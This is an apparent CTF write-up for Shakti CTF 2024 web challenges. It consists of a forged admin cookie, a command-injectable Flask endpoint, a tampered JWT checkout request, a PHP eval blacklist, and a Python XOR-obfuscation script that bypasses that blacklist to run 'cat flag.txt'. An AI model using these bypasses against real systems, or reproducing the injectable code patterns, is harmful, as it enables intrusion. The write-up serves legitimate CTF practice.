# Shakti CTF (2024) Writeup

> 原文: https://www.ctfiot.com/166696.html
> ID: 166696


```
Set-Cookie: cookie=eyJhZG1pbiI6MH0%3D; Path=/
GET / HTTP/2
Host: ch23900160354.ch.eng.run
Cookie: cookie=eyJhZG1pbiI6MX0%3D
@app.get('/')
def index():
 test = request.args.get('test', None)
 if test is None:
 return render_template('index.html')

 command = f"find {test}"

 try:
 output = os.popen(command).read()
POST /buy HTTP/2
Host: ch11900160369.ch.eng.run
Content-Length: 12
Content-Type: application/x-www-form-urlencoded

product_id=4
GET /checkout HTTP/2
Host: ch11900160369.ch.eng.run
Cookie: shopping_token=eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJhbW91bnQiOiA1MDAwfQ.qdH04CeYzu_qZoL2gBNdEsmtc3XKME6wAFw7CdjId5E
<?php
highlight_file(__FILE__);
$command = $_GET['command'] ?? '';

if($command === '') {
 die("Please provide a command\n");
}

function filter($command) {
 if(preg_match('/(`|\.|\$|\/|a|c|s|require|include)/i', $command)) {
 return false;
 }
 return true;
}

if(filter($command)) {
 eval($command);
 echo "Command executed";
} else {
 echo "Restricted characters have been used";
}
echo "\n";
?>
# ref: https://github.com/vichhika/CTF-Writeup/blob/main/GrabCON%20CTF%202021/Web/Basic%20Calc/README.md

    #string_code = ['system','ls'] # -> ("111114"^"BHBETY")("41"^"XB")
string_code = ['system','cat flag.txt'] # -> ("111114"^"BHBETY")("111q1411w111"^"RPEQWXPVYEIE")
obfuscated_code = ""
charset = "1234567890qwertyuiopdfghjklzxvbnmQWERTYUIOPDFGHJKLZXVBNM"

for code in string_code:
 obfuscated = ""
 set_a = ""
 set_b = ""
 for i in code:
 ok = False
 for j in charset:
 for k in charset:
 if ord(j)^ord(k) == ord(i):
 set_a += j
 set_b += k
 ok = True
 break
 if ok:
 break
 obfuscated_code += f'("{set_a}"^"{set_b}")'
print(''.join(["(\"%s\")" % i for i in string_code]) + '=' + obfuscated_code)
```
